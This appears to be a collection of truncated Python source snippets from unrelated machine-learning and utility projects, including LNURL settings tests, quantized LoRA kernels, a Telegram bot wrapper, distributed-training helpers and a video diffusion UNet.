    "from pydantic import SecretStr\nfrom yarl import URL\n\nfrom .settings import PhoenixdLNURLSettings\n\n\ndef test_testenv_settings_load():\n    settings = PhoenixdLNURLSettings(_env_file=\"test.env\")\n    assert settings.is_test is True\n    assert settings.debug is True\n    assert settings.username == \"satoshi\"\n    assert settings.lnurl_hostname == \"127.0.0.1\"\n    assert settings.phoenixd_url == SecretStr(\"http://satoshi:hunter2@127.0.0.1:9740\")\n    assert (\n        settings.user_nostr_address\n        == \"npub10pensatlcfwktnvjjw2dtem38n6rvw8g6fv73h84cuacxn4c28eqyfn34f\"\n    )\n    assert settings.user_profile_image_url == \"https://bitcoin.org/satoshi.png\"\n    assert settings.log_level == \"DEBUG\"\n    assert settings.min_sats_receivable == 1000\n    assert settings.max_sats_receivable == 500_000\n\n\ndef test_default_settings_load():\n    settings = PhoenixdLNURLSettings(_env_file=\"phoenixd-lnurl.env.example\")\n    # NOTE this is not set in the .env but overridden by environment variable:\n    assert settings.is_test is True\n    assert settings.debug is False\n    assert settings.username == \"satoshi\"\n    assert settings.lnurl_hostname == \"bitcoincore.org\"\n    assert settings.phoenixd_url == SecretStr(\"http://satoshi:hunter2@127.0.0.1:9740\")\n    assert settings.user_nostr_address is None\n    assert settings.user_profile_image_url is None\n    assert settings.log_level == \"INFO\"\n    assert settings.min_sats_receivable == 1\n    assert settings.max_sats_receivable == 2.1e15\n\n\ndef test_testenv_settings_derived_properties():\n    settings = PhoenixdLNURLSettings(_env_file=\"test.env\")\n    assert settings.base_url() == URL(\"https://127.0.0.1\")\n    assert settings.lnurl_address() == \"satoshi@127.0.0.1\"\n    assert settings.is_long_username() is False\n\n    settings.username = \"marttimalmi\"\n    assert settings.is_long_username() is True\n",
    "# Kindly borrowed from UnSloth's implementation\n\nimport triton\nMAX_FUSED_SIZE = 65536\nnext_power_of_2 = triton.next_power_of_2\n\ndef calculate_settings(n):\n    BLOCK_SIZE = next_power_of_2(n)\n    if BLOCK_SIZE > MAX_FUSED_SIZE:\n        raise RuntimeError(f\"Cannot launch Triton kernel since n = {n} exceeds \"\\\n                           f\"the maximum CUDA blocksize = {MAX_FUSED_SIZE}.\")\n    num_warps = 4\n    if   BLOCK_SIZE >= 32768: num_warps = 32\n    elif BLOCK_SIZE >=  8192: num_warps = 16\n    elif BLOCK_SIZE >=  2048: num_warps = 8\n    return BLOCK_SIZE, num_warps\npass\n\n\nimport bitsandbytes as bnb\nget_ptr = bnb.functional.get_ptr\nimport ctypes\nimport torch\ncdequantize_blockwise_fp32      = bnb.functional.lib.cdequantize_blockwise_fp32\ncdequantize_blockwise_fp16_nf4  = bnb.functional.lib.cdequantize_blockwise_fp16_nf4\ncdequantize_blockwise_bf16_nf4  = bnb.functional.lib.cdequantize_blockwise_bf16_nf4\ncgemm_4bit_inference_naive_fp16 = bnb.functional.lib.cgemm_4bit_inference_naive_fp16\ncgemm_4bit_inference_naive_bf16 = bnb.functional.lib.cgemm_4bit_inference_naive_bf16\n\n\ndef QUANT_STATE(W):\n    return getattr(W, \"quant_state\", None)\npass\n\n\ndef get_lora_parameters(proj):\n    # For DPO or disabled adapters\n    base_layer = (proj.base_layer if hasattr(proj, \"base_layer\") else proj)\n    W = base_layer.weight\n\n    if not hasattr(proj, \"disable_adapters\") or proj.disable_adapters or proj.merged:\n        return W, QUANT_STATE(W), None, None, None\n    pass\n\n    active_adapter = proj.active_adapters[0] if \\\n        hasattr(proj, \"active_adapters\") else proj.active_adapter\n    A = proj.lora_A [active_adapter].weight\n    B = proj.lora_B [active_adapter].weight\n    s = proj.scaling[active_adapter]\n    return W, QUANT_STATE(W), A, B, s\npass\n\n\ndef fast_dequantize(W, quant_state = None, out = None):\n    if quant_state is None: return W\n    if type(quant_state) is not list:\n        # New quant_state as a class\n        # https://github.com/TimDettmers/bitsandbytes/pull/763/files\n        absmax     = quant_state.absmax\n        shape      = quant_state.shape\n        dtype      = quant_state.dtype\n        blocksize  = quant_state.blocksize\n        offset     = quant_state.offset\n        state2     = quant_state.state2\n        absmax2    = state2.absmax\n        code2      = state2.code\n        blocksize2 = state2.blocksize\n    else:\n        # Old quant_state as a list of lists\n        absmax, shape, dtype, blocksize, compressed_stats, _, _ = quant_state\n        offset, state2 = compressed_stats\n        absmax2, code2, blocksize2, _, _, _, _ = state2\n    pass\n\n    # Create weight matrix\n    if out is None:\n        out = torch.empty(shape, dtype = dtype, device = \"cuda\")\n    else:\n        assert(out.shape == shape)\n        assert(out.dtype == dtype)\n\n    # NF4 dequantization of statistics\n    n_elements_absmax = absmax.numel()\n    out_absmax = torch.empty(n_elements_absmax, dtype = torch.float32, device = \"cuda\")\n\n    # Do dequantization\n    ptr_out_absmax = get_ptr(out_absmax)\n    cdequantize_blockwise_fp32(\n        get_ptr(code2), get_ptr(absmax), get_ptr(absmax2), ptr_out_absmax,\n        ctypes.c_int(blocksize2), ctypes.c_int(n_elements_absmax)\n    )\n    out_absmax += offset\n\n    fx = cdequantize_blockwise_fp16_nf4 if dtype == torch.float16 else \\\n         cdequantize_blockwise_bf16_nf4\n    fx(get_ptr(None), get_ptr(W), ptr_out_absmax, get_ptr(out),\n       ctypes.c_int(blocksize), ctypes.c_int(out.numel()))\n\n    # Careful returning transposed data\n    is_transposed = (True if W.shape[0] == 1 else False)\n    return out.t() if is_transposed else out\npass\n\n\ndef fast_gemv(X, W, quant_state, out = None):\n    if quant_state is None: return torch.matmul(X, W, out = out)\n    # For fast X @ W where seq_len == 1\n    # From https://github.com/TimDettmers/bitsandbytes/blob/main/bitsandbytes/functional.py#L1469\n    bsz, q_len, hd = X.shape\n    # assert(q_len == 1)\n\n    if type(quant_state) is not list:\n        # https://github.com/TimDettmers/bitsandbytes/pull/763/files\n        absmax     = quant_state.absmax\n        shape      = quant_state.shape\n        dtype      = quant_state.dtype\n        blocksize  = quant_state.blocksize\n        stats      = quant_state.code\n        offset     = quant_state.offset\n        state2     = quant_state.state2\n        absmax2    = state2.absmax\n        code2      = state2.code\n        blocksize2 = state2.blocksize\n    else:\n        absmax, shape, dtype, blocksize, compressed_stats, quant_type, stats = quant_state\n        offset, state2 = compressed_stats\n        absmax2, code2, blocksize2, _, _, _, _ = state2\n    pass\n    # assert(dtype == X.dtype)\n    bout = shape[0]\n\n    if out is None:\n        out = torch.empty((bsz, 1, bout,), dtype = dtype, device = \"cuda\")\n    else:\n        assert(out.shape == (bsz, 1, bout,))\n    pass\n\n    n = 1\n    m = shape[0]\n    k = shape[1]\n    lda = shape[0]\n    ldc = shape[0]\n    ldb = (hd+1)//2\n    m = ctypes.c_int32(m)\n    n = ctypes.c_int32(n)\n    k = ctypes.c_int32(k)\n    l",
    "from transformers import AutoTokenizer, AutoModel, AutoModelForCausalLM, TextStreamer\nfrom huggingface_hub import hf_hub_download\nimport os\nfrom rwkv.model import RWKV\nfrom rwkv.utils import PIPELINE, PIPELINE_ARGS\nimport torch\nimport argparse\nimport json\nfrom openai import OpenAI\nimport anthropic\nimport vertexai\nfrom vertexai.generative_models import GenerativeModel, Part, GenerationConfig\nfrom mamba_ssm.models.mixer_seq_simple import MambaLMHeadModel\nfrom lmdeploy import pipeline, GenerationConfig, TurbomindEngineConfig\n\nPROJECT_ID = \"gemini-infer\"  # @param {type:\"string\"}\nLOCATION = \"us-central1\"  # @param {type:\"string\"}\n\ngeneration_config = GenerationConfig(\n    temperature=1,\n    top_p=1.0,\n    top_k=32,\n    candidate_count=1,\n    max_output_tokens=100,\n)\n\nselected_labels = ['org:founded_by', 'per:employee_of', 'org:alternate_names', 'per:cities_of_residence', 'per:children', 'per:title', 'per:siblings', 'per:religion', 'per:age', 'org:website', 'per:stateorprovinces_of_residence', 'org:member_of', 'org:top_members/employees', 'per:countries_of_residence', 'org:city_of_headquarters', 'org:members', 'org:country_of_headquarters', 'per:spouse', 'org:stateorprovince_of_headquarters', 'org:number_of_employees/members', 'org:parents', 'org:subsidiaries', 'per:origin', 'org:political/religious_affiliation', 'per:other_family', 'per:stateorprovince_of_birth', 'org:dissolved', 'per:date_of_death', 'org:shareholders', 'per:alternate_names', 'per:parents', 'per:schools_attended', 'per:cause_of_death', 'per:city_of_death', 'per:stateorprovince_of_death', 'org:founded', 'per:country_of_birth', 'per:date_of_birth', 'per:city_of_birth', 'per:charges', 'per:country_of_death']\n\ndef select_data(given_dataset, number_of_turns):\n    turns = 0\n    label_list = []\n    selected_data_list = []\n    for data in given_dataset:\n        if data['relation'] not in label_list and data['relation'] in selected_labels:\n            selected_data_list.append(data)\n            label_list.append(data['relation'])\n        if len(label_list) == len(selected_labels):\n            turns += 1\n            if turns == number_of_turns:\n                break\n            else:\n                label_list = []\n    return selected_data_list\n\ndef select_test(given_dataset, number_of_turns):\n    selected_data_list = []\n    count_dict = {rela: 0 for rela in selected_labels}\n    print(\"==========\")\n    print(len(given_dataset))\n    for data in given_dataset:\n        if data['relation'] in selected_labels and count_dict[data['relation']] < number_of_turns:\n            selected_data_list.append(data)\n            count_dict[data['relation']] += 1\n    return selected_data_list\n\ndef format_discovery_prompt(data_dict_list, with_instruction=False, round=0, context_token_number=\"2k\", group=False):\n    token_shot_map_dict = {\"600\": 5, \"2k\": 25, \"5k\": 67, \"10k\": 133, \"15k\": 204, \"20k\": 270, \"25k\": 362,\n                           \"32k\": 421}\n    prompt = 'Given a sentence and a pair of subject and object entities within the sentence, please predict the relation between the given entities.'\n    if with_instruction:\n        prompt = prompt + \" The predicted relationship must come from these classes: \"\n        for i, word in enumerate(selected_labels):\n            if i != len(selected_labels) - 1:\n                prompt = prompt + word + ', '\n            else:\n                prompt = prompt + word + '.\\n'\n    prompt = prompt + ' The examples are as follows: \\n'\n    if round != 0:\n        index = len(data_dict_list)\n        print(f\"======={round} round running========\")\n        print(\"number of instances: \", index)\n    else:\n        index = token_shot_map_dict[context_token_number]\n\n    data_list = data_dict_list[:index]\n    print(\"org data_list: \", data_list)\n    if group:\n        print(\"==============demo grouped==============\")\n        data_list = sorted(data_list, key=lambda d: d['relation'])\n        print(\"after grouping data_list: \", data_list)\n\n    position_number_record = {}\n    pos = 0\n    for data in data_list:\n        pos += 1\n        if data[\"relation\"] not in position_number_record:\n            position_number_record[data[\"relation\"]] = {}\n            position_number_record[data[\"relation\"]][\"number\"] = 1\n            position_number_record[data[\"relation\"]][\"pos\"] = [pos]\n        else:\n            position_number_record[data[\"relation\"]][\"number\"] += 1\n            position_number_record[data[\"relation\"]][\"pos\"].append(pos)\n    print(\"position_number_record: \", position_number_record)\n    for data in data_list:\n        prompt = prompt + \"sentence: \" + data['sentence'] + '\\n'\n        prompt = prompt + \"the subject is \" + data[\"subject_entity\"] + \" and the object is \" + data[\"object_entity\"] + '\\n'\n        prompt = prompt + \"the relation between the two entities is: \" + data[\"relation\"] + '\\n'\n    return prompt, position_number_record\n\ndef generate_text(project_id: str, location: str, prompt: str, model) -> str:\n    # Initialize Vertex AI\n    vertexai.init(p",
    "import asyncio\nimport re\nfrom copy import deepcopy\nfrom typing import Optional, Any\n\nfrom .request import req\nfrom .ass import ass\n\n\ndef parse_markdown(text: str, p: bool = False) -> str:\n    text = re.sub(r\"&\", \"&amp;\", text)\n    text = re.sub(r\"<\", \"&lt;\", text)\n    text = re.sub(r\">\", \"&gt;\", text)\n\n    patterns = [\n        (r'(http[s]?://[^(\\s|\")]+)', '<a href=\"\\\\1\">\\\\1</a>'),\n        (r\"^# (.*)$\", \"<h1>\\\\1</h1>\"),\n        (r\"\\*\\*(.+?)\\*\\*\", \"<b>\\\\1</b>\"),\n        (r\"__(.+?)__\", \"<i>\\\\1</i>\"),\n        (r\"```(\\w+)\\n(.*?)```\", '<pre><code class=\"language-\\\\1\">\\\\2</code></pre>'),\n        (r\"```\\n(.*?)```\", \"<pre><code>\\\\1</code></pre>\"),\n        (r\"`([^`]+)`\", \"<code>\\\\1</code>\"),\n        (r\"^> (.*)\", \"<blockquote>\\\\1</blockquote>\"),\n    ]\n    for pattern, replacement in patterns:\n        text = re.sub(pattern, replacement, text, flags=re.MULTILINE | re.DOTALL)\n\n    if p:\n        lines = text.split(\"\\n\")\n        in_code = False\n        for i, line in enumerate(lines):\n            line = line.strip()\n            if line.startswith(\"<pre\"):\n                in_code = True\n            if \"</pre>\" in line:\n                in_code = False\n                continue\n            if not in_code:\n                lines[i] = \"<p>\" + line + \"</p>\"\n\n        text = \"\\n\".join(lines)\n\n    return text\n\n\ndef extract_value(data: dict[str, Any], dotted: str, default: Any = None) -> Any:\n    if \".\" not in dotted:\n        return data.get(dotted, default)\n    segment, other = dotted.split(\".\", 1)\n    if segment not in data:\n        return default\n    return extract_value(data[segment], other)\n\n\nclass MiniGramMessage:\n    def __init__(self, data: dict):\n        self.data = deepcopy(data)\n        if \"message\" not in self.data:\n            raise ValueError(\"no `message` in your data!\")\n        msg = self.data[\"message\"]\n        self.chat_id = extract_value(msg, \"chat.id\")\n        self.text = extract_value(msg, \"text\")\n        self.message_id = extract_value(msg, \"message_id\")\n        self.from_user = extract_value(msg, \"from\", {})\n        self.from_id = self.from_user.get(\"id\")\n\n    def __repr__(self):\n        return f\"<MiniGramMessage from {self.from_id}/{self.from_user} {self.chat_id} {self.message_id} {self.text}>\"\n\n    def reply(self, text: str) -> \"MiniGramMessage\":\n        self.text = text\n        return self\n\n\nclass MiniGram:\n    def __init__(self, key: str):\n        global CURRENT\n        self.key = key\n        self.last_updated_id = 0\n        self.post_init()\n        CURRENT = self\n\n    def post_init(self):\n        pass\n\n    @ass\n    async def shutdown(self):\n        await self.delete_webhook()\n\n    @ass\n    async def incoming(self, msg: MiniGramMessage) -> Optional[MiniGramMessage]:\n        pass\n\n    @classmethod\n    def current(cls) -> \"MiniGram\":\n        global CURRENT\n        if CURRENT is None:\n            raise ValueError(\"No current MiniGram\")\n        return CURRENT\n\n    @ass\n    async def req(self, method: str, **kwargs) -> dict:\n        url = f\"https://api.telegram.org/bot{self.key}/{method}\"\n        code, response = await req(url, kwargs)\n        return response\n\n    @ass\n    async def start_polling(self):\n        while True:\n            updates = await self.get_updates()\n            for update in updates.get(\"result\", []):\n                msg = MiniGramMessage(update)\n                res = await self.incoming(msg)\n                if res:\n                    await self.reply_to_message(res)\n                self.last_updated_id = update[\"update_id\"]\n            await asyncio.sleep(0.1)\n\n    @ass\n    async def get_updates(self) -> dict:\n        if self.last_updated_id != 0:\n            return await self.req(\n                \"getUpdates\", offset=self.last_updated_id + 1, timeout=60\n            )\n        return await self.req(\"getUpdates\", timeout=60)\n\n    @ass\n    async def send_text(\n        self, chat_id: int, text: str, parse_mode: str = \"HTML\", **kwargs\n    ) -> dict:\n        return await self.req(\n            \"sendMessage\", chat_id=chat_id, text=text, parse_mode=parse_mode, **kwargs\n        )\n\n    @ass\n    async def reply_to_message(self, reply: MiniGramMessage):\n        reply_params = {\n            \"chat_id\": reply.chat_id,\n            \"text\": reply.text,\n            \"reply_to_message_id\": reply.message_id,\n        }\n        return await self.req(\"sendMessage\", **reply_params)\n\n    @ass\n    async def set_webhook(self, url: str) -> dict:\n        return await self.req(\"setWebhook\", url=url)\n\n    @ass\n    async def delete_webhook(self) -> dict:\n        return await self.req(\"deleteWebhook\")\n\n    @ass\n    async def get_webhook_info(self) -> dict:\n        return await self.req(\"getWebhookInfo\")\n\n    async def async_handler(self, data: dict) -> None:\n        msg = MiniGramMessage(data)\n        res = await self.incoming(msg)\n        if res:\n            await self.reply_to_message(res)\n\n    def sync_handler(self, data: dict) -> None:\n        msg = MiniGramMessage(data)\n        res = self.incoming(msg)\n        if res:\n   ",
    "import datetime\nimport functools\nimport os\nimport sys\nfrom typing import List\nfrom typing import Union\n\nimport torch\nimport torch.distributed as tdist\nimport torch.multiprocessing as mp\n\n__rank, __local_rank, __world_size, __device = 0, 0, 1, 'cuda' if torch.cuda.is_available() else 'cpu'\n__initialized = False\n\n\ndef initialized():\n    return __initialized\n\n\ndef initialize(fork=False, backend='nccl', gpu_id_if_not_distibuted=0, timeout=30):\n    global __device\n    if not torch.cuda.is_available():\n        print(f'[dist initialize] cuda is not available, use cpu instead', file=sys.stderr)\n        return\n    elif 'RANK' not in os.environ:\n        torch.cuda.set_device(gpu_id_if_not_distibuted)\n        __device = torch.empty(1).cuda().device\n        print(f'[dist initialize] env variable \"RANK\" is not set, use {__device} as the device', file=sys.stderr)\n        return\n    # then 'RANK' must exist\n    global_rank, num_gpus = int(os.environ['RANK']), torch.cuda.device_count()\n    local_rank = global_rank % num_gpus\n    torch.cuda.set_device(local_rank)\n    \n    # ref: https://github.com/open-mmlab/mmcv/blob/master/mmcv/runner/dist_utils.py#L29\n    if mp.get_start_method(allow_none=True) is None:\n        method = 'fork' if fork else 'spawn'\n        print(f'[dist initialize] mp method={method}')\n        mp.set_start_method(method)\n    tdist.init_process_group(backend=backend, timeout=datetime.timedelta(seconds=timeout*60))\n    \n    global __rank, __local_rank, __world_size, __initialized\n    __local_rank = local_rank\n    __rank, __world_size = tdist.get_rank(), tdist.get_world_size()\n    __device = torch.empty(1).cuda().device\n    __initialized = True\n    \n    assert tdist.is_initialized(), 'torch.distributed is not initialized!'\n    print(f'[lrk={get_local_rank()}, rk={get_rank()}]')\n\n\ndef get_rank():\n    return __rank\n\n\ndef get_local_rank():\n    return __local_rank\n\n\ndef get_world_size():\n    return __world_size\n\n\ndef get_device():\n    return __device\n\n\ndef set_gpu_id(gpu_id: int):\n    if gpu_id is None: return\n    global __device\n    if isinstance(gpu_id, (str, int)):\n        torch.cuda.set_device(int(gpu_id))\n        __device = torch.empty(1).cuda().device\n    else:\n        raise NotImplementedError\n\n\ndef is_master():\n    return __rank == 0\n\n\ndef is_local_master():\n    return __local_rank == 0\n\n\ndef is_visualizer():\n    return __rank == 0\n\n\ndef new_group(ranks: List[int]):\n    if __initialized:\n        return tdist.new_group(ranks=ranks)\n    return None\n\n\ndef barrier():\n    if __initialized:\n        tdist.barrier()\n\n\ndef allreduce(t: torch.Tensor, async_op=False):\n    if __initialized:\n        if not t.is_cuda:\n            cu = t.detach().cuda()\n            ret = tdist.all_reduce(cu, async_op=async_op)\n            t.copy_(cu.cpu())\n        else:\n            ret = tdist.all_reduce(t, async_op=async_op)\n        return ret\n    return None\n\n\ndef allgather(t: torch.Tensor, cat=True) -> Union[List[torch.Tensor], torch.Tensor]:\n    if __initialized:\n        if not t.is_cuda:\n            t = t.cuda()\n        ls = [torch.empty_like(t) for _ in range(__world_size)]\n        tdist.all_gather(ls, t)\n    else:\n        ls = [t]\n    if cat:\n        ls = torch.cat(ls, dim=0)\n    return ls\n\n\ndef allgather_diff_shape(t: torch.Tensor, cat=True) -> Union[List[torch.Tensor], torch.Tensor]:\n    if __initialized:\n        if not t.is_cuda:\n            t = t.cuda()\n        \n        t_size = torch.tensor(t.size(), device=t.device)\n        ls_size = [torch.empty_like(t_size) for _ in range(__world_size)]\n        tdist.all_gather(ls_size, t_size)\n        \n        max_B = max(size[0].item() for size in ls_size)\n        pad = max_B - t_size[0].item()\n        if pad:\n            pad_size = (pad, *t.size()[1:])\n            t = torch.cat((t, t.new_empty(pad_size)), dim=0)\n        \n        ls_padded = [torch.empty_like(t) for _ in range(__world_size)]\n        tdist.all_gather(ls_padded, t)\n        ls = []\n        for t, size in zip(ls_padded, ls_size):\n            ls.append(t[:size[0].item()])\n    else:\n        ls = [t]\n    if cat:\n        ls = torch.cat(ls, dim=0)\n    return ls\n\n\ndef broadcast(t: torch.Tensor, src_rank) -> None:\n    if __initialized:\n        if not t.is_cuda:\n            cu = t.detach().cuda()\n            tdist.broadcast(cu, src=src_rank)\n            t.copy_(cu.cpu())\n        else:\n            tdist.broadcast(t, src=src_rank)\n\n\ndef dist_fmt_vals(val: float, fmt: Union[str, None] = '%.2f') -> Union[torch.Tensor, List]:\n    if not initialized():\n        return torch.tensor([val]) if fmt is None else [fmt % val]\n    \n    ts = torch.zeros(__world_size)\n    ts[__rank] = val\n    allreduce(ts)\n    if fmt is None:\n        return ts\n    return [fmt % v for v in ts.cpu().numpy().tolist()]\n\n\ndef master_only(func):\n    @functools.wraps(func)\n    def wrapper(*args, **kwargs):\n        force = kwargs.pop('force', False)\n        if force or is_master():\n            ret = func(*args, **kwargs)\n        else:\n            ret = None\n        barrie",
    "import numpy as np\n\nimport torch\n\nclass TonemapHDR(object):\n    \"\"\"\n        Tonemap HDR image globally. First, we find alpha that maps the (max(tensor_img) * percentile) to max_mapping.\n        Then, we calculate I_out = alpha * I_in ^ (1/gamma)\n        input : torch.Tensor batch of images : [H, W, C]\n        output : torch.Tensor batch of images : [H, W, C]\n    \"\"\"\n\n    def __init__(self, gamma=2.4, percentile=50, max_mapping=0.5):\n        self.gamma = gamma\n        self.percentile = percentile\n        self.max_mapping = max_mapping  # the value to which alpha will map the (max(tensor_img) * percentile) to\n\n    def __call__(self, tensor_img, clip=True, alpha=None, gamma=True):\n        if gamma:\n            power_tensor_img = torch.pow(tensor_img, 1 / self.gamma)\n        else:\n            power_tensor_img = tensor_img\n        non_zero = power_tensor_img > 0\n        if non_zero.any():\n            r_percentile = torch.quantile(power_tensor_img[non_zero], self.percentile / 100.0)\n        else:\n            r_percentile = torch.quantile(power_tensor_img, self.percentile / 100.0)\n        if alpha is None:\n            alpha = self.max_mapping / (r_percentile + 1e-10)\n        tonemapped_img = alpha * power_tensor_img\n\n        if clip:\n            tonemapped_img_clip = torch.clamp(tonemapped_img, 0, 1)\n        else:\n            tonemapped_img_clip = tonemapped_img\n\n        return tonemapped_img_clip.float(), alpha, tonemapped_img",
    "from itertools import repeat\nimport collections.abc\n\nimport torch\nfrom torch import nn as nn\nfrom torchvision.ops.misc import FrozenBatchNorm2d\n\n\ndef freeze_batch_norm_2d(module, module_match={}, name=''):\n    \"\"\"\n    Converts all `BatchNorm2d` and `SyncBatchNorm` layers of provided module into `FrozenBatchNorm2d`. If `module` is\n    itself an instance of either `BatchNorm2d` or `SyncBatchNorm`, it is converted into `FrozenBatchNorm2d` and\n    returned. Otherwise, the module is walked recursively and submodules are converted in place.\n\n    Args:\n        module (torch.nn.Module): Any PyTorch module.\n        module_match (dict): Dictionary of full module names to freeze (all if empty)\n        name (str): Full module name (prefix)\n\n    Returns:\n        torch.nn.Module: Resulting module\n\n    Inspired by https://github.com/pytorch/pytorch/blob/a5895f85be0f10212791145bfedc0261d364f103/torch/nn/modules/batchnorm.py#L762\n    \"\"\"\n    res = module\n    is_match = True\n    if module_match:\n        is_match = name in module_match\n    if is_match and isinstance(module, (nn.modules.batchnorm.BatchNorm2d, nn.modules.batchnorm.SyncBatchNorm)):\n        res = FrozenBatchNorm2d(module.num_features)\n        res.num_features = module.num_features\n        res.affine = module.affine\n        if module.affine:\n            res.weight.data = module.weight.data.clone().detach()\n            res.bias.data = module.bias.data.clone().detach()\n        res.running_mean.data = module.running_mean.data\n        res.running_var.data = module.running_var.data\n        res.eps = module.eps\n    else:\n        for child_name, child in module.named_children():\n            full_child_name = '.'.join([name, child_name]) if name else child_name\n            new_child = freeze_batch_norm_2d(child, module_match, full_child_name)\n            if new_child is not child:\n                res.add_module(child_name, new_child)\n    return res\n\n\n# From PyTorch internals\ndef _ntuple(n):\n    def parse(x):\n        if isinstance(x, collections.abc.Iterable):\n            return x\n        return tuple(repeat(x, n))\n    return parse\n\n\nto_1tuple = _ntuple(1)\nto_2tuple = _ntuple(2)\nto_3tuple = _ntuple(3)\nto_4tuple = _ntuple(4)\nto_ntuple = lambda n, x: _ntuple(n)(x)\n\n# Replaces all linear layers with linear_replacement\n# TODO: add int8 support for other linear layers including attn and convnets\ndef replace_linear(model, linear_replacement, include_modules=['c_fc', 'c_proj'], copy_weights=True):\n    for name, module in model.named_children():\n        if len(list(module.children())) > 0:\n            replace_linear(module, linear_replacement, include_modules, copy_weights)\n\n        if isinstance(module, torch.nn.Linear) and name in include_modules:\n            old_module = model._modules[name]\n            model._modules[name] = linear_replacement(\n                module.in_features,\n                module.out_features,\n                module.bias is not None,\n            )\n            if copy_weights:\n                model._modules[name].weight.data.copy_(old_module.weight.data)\n                if model._modules[name].bias is not None:\n                    model._modules[name].bias.data.copy_(old_module.bias)\n\n    return model\n\ndef convert_int8_model_to_inference_mode(model):\n    for m in model.modules():\n        if hasattr(m, 'prepare_for_eval'):\n            int8_original_dtype = m.weight.dtype\n            m.prepare_for_eval()\n            m.int8_original_dtype = int8_original_dtype",
    "# Adapted from https://github.com/huggingface/diffusers/blob/main/src/diffusers/models/unet_2d_condition.py\nimport os\nimport json\nimport safetensors\nimport logging\nimport torch\nimport torch.nn as nn\nimport torch.utils.checkpoint\n\nfrom einops import repeat, rearrange\nfrom dataclasses import dataclass\nfrom typing import List, Optional, Tuple, Union, Dict, Any\n\nfrom diffusers.configuration_utils import ConfigMixin, register_to_config\nfrom diffusers.models.attention_processor import AttentionProcessor\n\nfrom diffusers.models.modeling_utils import ModelMixin\nfrom diffusers.utils import BaseOutput, logging\nfrom diffusers.models.embeddings import TimestepEmbedding, Timesteps\nfrom diffusers.models.attention_processor import LoRAAttnProcessor\nfrom diffusers.loaders import AttnProcsLayers, UNet2DConditionLoadersMixin\n\nfrom cameractrl.models.unet_blocks import (\n    CrossAttnDownBlock3D,\n    CrossAttnUpBlock3D,\n    DownBlock3D,\n    UNetMidBlock3DCrossAttn,\n    UpBlock3D,\n    get_down_block,\n    get_up_block,\n)\nfrom cameractrl.models.attention_processor import (\n    LORAPoseAdaptorAttnProcessor,\n    PoseAdaptorAttnProcessor\n)\nfrom cameractrl.models.attention_processor import LoRAAttnProcessor as CustomizedLoRAAttnProcessor\nfrom cameractrl.models.attention_processor import AttnProcessor as CustomizedAttnProcessor\nfrom cameractrl.models.resnet import (\n    InflatedConv3d,\n    FusionBlock2D\n)\n\n@dataclass\nclass UNet3DConditionOutput(BaseOutput):\n    sample: torch.FloatTensor\n\n\nclass UNet3DConditionModel(ModelMixin, ConfigMixin, UNet2DConditionLoadersMixin):\n    _supports_gradient_checkpointing = True\n\n    @register_to_config\n    def __init__(\n            self,\n            sample_size: Optional[int] = None,\n            in_channels: int = 4,\n            out_channels: int = 4,\n            center_input_sample: bool = False,\n            flip_sin_to_cos: bool = True,\n            freq_shift: int = 0,\n            down_block_types: Tuple[str] = (\n                    \"CrossAttnDownBlock3D\",\n                    \"CrossAttnDownBlock3D\",\n                    \"CrossAttnDownBlock3D\",\n                    \"DownBlock3D\",\n            ),\n            mid_block_type: str = \"UNetMidBlock3DCrossAttn\",\n            up_block_types: Tuple[str] = (\n                    \"UpBlock3D\",\n                    \"CrossAttnUpBlock3D\",\n                    \"CrossAttnUpBlock3D\",\n                    \"CrossAttnUpBlock3D\",\n            ),\n            only_cross_attention: Union[bool, Tuple[bool]] = False,\n            block_out_channels: Tuple[int] = (320, 640, 1280, 1280),\n            layers_per_block: int = 2,\n            downsample_padding: int = 1,\n            mid_block_scale_factor: float = 1,\n            act_fn: str = \"silu\",\n            norm_num_groups: int = 32,\n            norm_eps: float = 1e-5,\n            cross_attention_dim: int = 1280,\n            attention_head_dim: Union[int, Tuple[int]] = 8,\n            dual_cross_attention: bool = False,\n            use_linear_projection: bool = False,\n            class_embed_type: Optional[str] = None,\n            addition_embed_type: Optional[str] = None,\n            num_class_embeds: Optional[int] = None,\n            upcast_attention: bool = False,\n            resnet_time_scale_shift: str = \"default\",\n\n            # Additional\n            use_motion_module=False,\n            motion_module_resolutions=(1, 2, 4, 8),\n            motion_module_mid_block=False,\n            motion_module_type=None,\n            motion_module_kwargs={},\n\n            # whether fuse first frame's feature\n            fuse_first_frame: bool = False,\n    ):\n        super().__init__()\n        self.logger = logging.get_logger(__name__)\n\n        self.sample_size = sample_size\n        time_embed_dim = block_out_channels[0] * 4\n\n        # input\n        self.conv_in = InflatedConv3d(in_channels, block_out_channels[0], kernel_size=3, padding=(1, 1))\n\n        # time\n        self.time_proj = Timesteps(block_out_channels[0], flip_sin_to_cos, freq_shift)\n        timestep_input_dim = block_out_channels[0]\n\n        self.time_embedding = TimestepEmbedding(timestep_input_dim, time_embed_dim)\n\n        # class embedding\n        if class_embed_type is None and num_class_embeds is not None:\n            self.class_embedding = nn.Embedding(num_class_embeds, time_embed_dim)\n        elif class_embed_type == \"timestep\":\n            self.class_embedding = TimestepEmbedding(timestep_input_dim, time_embed_dim)\n        elif class_embed_type == \"identity\":\n            self.class_embedding = nn.Identity(time_embed_dim, time_embed_dim)\n        else:\n            self.class_embedding = None\n\n        self.down_blocks = nn.ModuleList([])\n        self.mid_block = None\n        self.up_blocks = nn.ModuleList([])\n\n        self.down_fusers = nn.ModuleList([])\n        self.mid_fuser = None\n        self.down_fusers.append(\n            FusionBlock2D(\n                in_channels=block_out_channels[0],\n                out_channels=block_out_channels[0],\n                temb_channels=time_embed_",
    "Negative_Prompt_CFG = {\n    \"Empty\": {\n        \"base_model\": \"\",\n        \"prompt\": \"\",\n        \"refer\": \"\",\n    },\n    \"V1\": {\n        \"base_model\": \"\",\n        \"prompt\": \"nsfw, lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts, signature, watermark, username, blurry, tail, watermarks\",\n        \"refer\": \"\",\n    },\n    \"V2\": {\n        \"base_model\": \"\",\n        \"prompt\": \"badhandv4, ng_deepnegative_v1_75t, (((multiple heads))), (((bad body))), (((two people))), ((extra arms)), ((deformed body)), (((sexy))), paintings,(((two heads))), ((big head)),sketches, (worst quality:2), (low quality:2), (normal quality:2), lowres, ((monochrome)), ((grayscale)), skin spots, acnes, skin blemishes, age spot, glans, (((nsfw))), nipples, extra fingers, (extra legs), (long neck), mutated hands, (fused fingers), (too many fingers)\",\n        \"refer\": \"Weiban\",\n    },\n    \"V3\": {\n        \"base_model\": \"\",\n        \"prompt\": \"badhandv4, 